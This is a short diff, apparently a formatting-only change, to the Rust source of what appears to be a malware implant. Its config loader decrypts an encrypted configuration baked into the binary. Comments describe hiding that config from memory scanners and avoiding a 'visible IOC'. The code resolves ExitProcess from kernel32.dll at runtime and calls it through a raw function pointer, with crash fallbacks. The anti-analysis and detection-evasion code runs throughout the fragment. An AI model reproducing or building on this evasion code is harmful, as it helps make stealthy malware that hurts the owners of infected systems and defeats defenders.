@@ -48,7 +48,8 @@ mod baked {
 /// process lifetime. This prevents memory scanners from reading the decrypted
 /// config at rest.
 pub fn load() -> (Config, Vec<u8>) {
-    let plain: Vec<u8> = nyx_config::decrypt(&baked::CONFIG_KEY, &baked::CONFIG_NONCE, baked::CONFIG_CT);
+    let plain: Vec<u8> =
+        nyx_config::decrypt(&baked::CONFIG_KEY, &baked::CONFIG_NONCE, baked::CONFIG_CT);
     match decode(&plain) {
         Ok(c) => (c, plain),
         Err(_) => {
@@ -56,9 +57,7 @@ pub fn load() -> (Config, Vec<u8>) {
             // Try ExitProcess → TerminateProcess → int3 in order. A crash is
             // better than a hanging process (visible IOC).
             unsafe {
-                if let Some(addr) =
-                    crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess")
-                {
+                if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
                     let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
                     f(0xC000_0001);
                 }
